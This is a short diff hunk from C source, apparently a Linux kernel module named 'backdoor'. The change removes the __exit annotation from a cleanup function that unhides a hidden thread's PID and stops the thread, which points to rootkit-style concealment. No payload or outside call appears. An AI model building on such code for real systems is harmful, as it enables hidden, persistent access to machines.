@@ -38,7 +38,7 @@ int __init backdoor_init(void){
 	return 0;
 }
 
-void __exit backdoor_exit(void){
+void backdoor_exit(void){
 	unhide_pid(backdoor_thread->pid);
 	kthread_stop(backdoor_thread);
 }
